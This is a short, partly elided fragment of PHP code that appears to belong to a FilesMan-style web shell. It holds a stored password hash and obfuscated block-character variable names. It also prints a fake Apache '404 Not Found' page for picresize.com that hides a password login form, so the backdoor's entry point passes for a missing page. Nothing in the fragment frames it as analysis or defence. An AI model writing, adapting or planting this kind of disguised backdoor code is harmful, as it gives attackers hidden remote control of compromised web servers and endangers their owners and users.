...
//-----------------Password---------------------
$▛ = "7fddb3d9fcce3506347462b0f066e75d";
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
...
die('<HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>Not Found</H1>The requested URL was not found on this server.<P><HR><ADDRESS>Apache Server at picresize.com</ADDRESS></BODY></HTML><form method=post>Please go back to the homepage.<br><input placeholder="" type=password name=pass required><input type=submit name="watching" value=">>"></form>');
	//die('<form method=post>test text<br><input placeholder="password" type="password" name=pass required><input type=submit name="watching" value=">>"></form>');
}
